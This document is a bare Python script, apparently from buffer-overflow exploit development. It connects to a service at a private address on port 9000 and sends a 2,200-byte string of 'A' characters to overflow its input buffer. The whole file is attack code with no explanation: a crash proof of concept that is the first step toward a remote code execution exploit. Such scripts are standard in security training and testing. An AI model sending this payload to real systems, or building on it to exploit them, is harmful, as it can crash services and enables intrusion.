#!/usr/bin/python

import socket, sys

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect(('172.16.73.129', 9000))

buffer = "A"*2200

sock.send(buffer)

sock.close()
